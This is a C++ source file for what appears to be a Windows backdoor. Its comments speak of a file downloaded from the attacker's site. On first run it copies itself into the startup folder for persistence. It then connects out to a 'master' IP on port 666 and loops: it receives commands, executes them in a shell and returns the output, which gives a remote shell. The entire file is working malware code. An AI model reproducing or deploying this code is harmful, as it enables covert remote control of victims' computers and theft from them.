#include<iostream>

#include "Network.h"
#include "Utils.h"

void telNet(SOCKET s)
{
    char* buf = new char[65536];
    std::string stdOut;
    while (1)
    {
        if(!recv(s, buf, 65536, 0))
            break;
        stdOut = executeShell(buf);
        if (!sendStdOut(s, stdOut))
            break;
    }
    delete[] buf;
}

int main(int argc, char** argv)
{
    /*running once after file is downloaded from the attacker's site*/
    if (!isInStartUp(argv[0])) //check if the application is running from the startUp directory
    {
        copyToStartUp(argv[0]);
        executeStartUpFile();
    }

    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    sockaddr_in destinfo;
    uint32_t mastersIP = findMastersIP();
    if (!mastersIP)
        return 1;
    destinfo.sin_addr.s_addr = mastersIP;
    destinfo.sin_port = htons(666);
    destinfo.sin_family = AF_INET;

    SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
    connect(s, (sockaddr*)&destinfo, sizeof destinfo);

    if (!s)
        return 1;
    telNet(s);

}